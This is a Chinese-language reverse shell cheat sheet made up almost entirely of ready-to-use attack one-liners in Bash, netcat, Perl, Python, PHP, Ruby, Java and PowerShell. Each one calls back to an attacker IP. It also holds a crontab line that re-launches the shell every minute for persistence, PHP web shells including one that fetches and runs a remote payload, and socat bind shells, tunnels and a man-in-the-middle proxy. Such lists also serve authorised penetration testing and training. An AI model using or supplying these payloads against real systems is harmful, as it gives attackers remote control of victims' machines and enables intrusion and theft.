# Reverse Shell

reverse shell的cheat sheet



### shell的集合

https://www.revshells.com/

### Bash

```bash
bash -i >& /dev/tcp/192.168.119.125/8080 0>&1
 
bash -c "bash -i >& /dev/tcp/192.168.119.125/8080 0>&1"
```

```bash
nc -nvlp 8080
```

### NC

-e不可用时候

```bash
rm -f /tmp/d; mkfifo /tmp/d; /bin/sh -c "cat /tmp/d | /bin/sh -i 2>&1 | nc 192.168.119.125 8080 > /tmp/d"
 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.125 8080 >/tmp/f
```

-e 可用

```bash
nc -e /bin/sh 192.168.119.125 8080
```

```bash
nc -nvlp 8080
```

### Perl

```perl
perl -e 'use Socket;$i="192.168.119.125";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.119.125:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```bash
nc -nvlp 8080
```

### Python

python3 以及python2都可用

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.125",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.125",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

另外的形式 2/3都可用

```python
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('192.168.119.125',8080))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
```

```bash
nc -nvlp 8080
```

### php

```php
php -r '$sock=fsockopen("192.168.119.125",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
nc -nvlp 8080
```

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("192.168.119.125",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

不依赖于/bin/sh的shell

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.119.125","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

如果目标系统运行Windows

```ruby
ruby -rsocket -e 'c=TCPSocket.new("192.168.119.125","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

```bash
nc -nvlp 8080
```

### JAVA

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.119.125/8080;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

```bash
nc -nvlp 8080
```



### crontab定时任务

crontab -e编辑当前用户的任务，或者是写到计划任务目录，一般是/var/spool/cron/目录，ubuntu是/var/spool/cron/crontabs。文件名为用户名root等。下面命令含义是每一分钟执行一次反弹shell命令。具体crontab用法可以参考Crontab定时任务配置

```
* * * * * /bin/bash -i >& /dev/tcp/192.168.119.125/8080 0>&1
```

# PHP web reverse shell

```php
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.119.125/80800>&1'");
```

```php
<?php shell_exec("bash -i >& /dev/tcp/192.168.119.125/8080 0>&1");?>
```

如果遇见情况无法直接执行oneliner shell 可以让靶机下载然后执行。

```php
<?php system("wget http://192.168.119.125/rev.php -O /tmp/shell.php;php /tmp/shell.php");?>
```

### SOCAT

#### TCP reverse shell

listen

```bash
socat [file:`tty`,echo=0,raw](file://,echo=0,raw) tcp-listen:8888
```

exec

```bash
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.119.125:8888
```

#### socat tunnel

```
socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:80 
```

```
socat TCP-LISTEN:8085,fork,reuseaddr TCP:127.0.0.1:65334 
```

#### Stable TTY bind

victim

```bash
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane 
```

Connect from local:

```bash
socat [FILE:`tty`,raw,echo=0](FILE://,raw,echo=0) TCP:192.168.0.74:1337 
```

#### Bind a binary to a port

```
exec socat TCP-LISTEN:31337,fork,reuseaddr EXEC:/home/leak,echo=0,pty,stderr
```

#### Fork a port

```
socat TCP-LISTEN:4444,fork TCP:localhost:1337
```

#### mitm ipv6 proxy

ipv4 (capture in burp)

```bash
socat TCP-LISTEN:80,fork,reuseaddr TCP:127.0.0.1:8080
```

ipv6:

```bash
socat -v tcp4-listen:5985,reuseaddr,fork tcp6:[dead:babe::1001]:5985
```

http://42.192.89.201/tools/socat.html

## powershell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.125',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.125',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()"
```

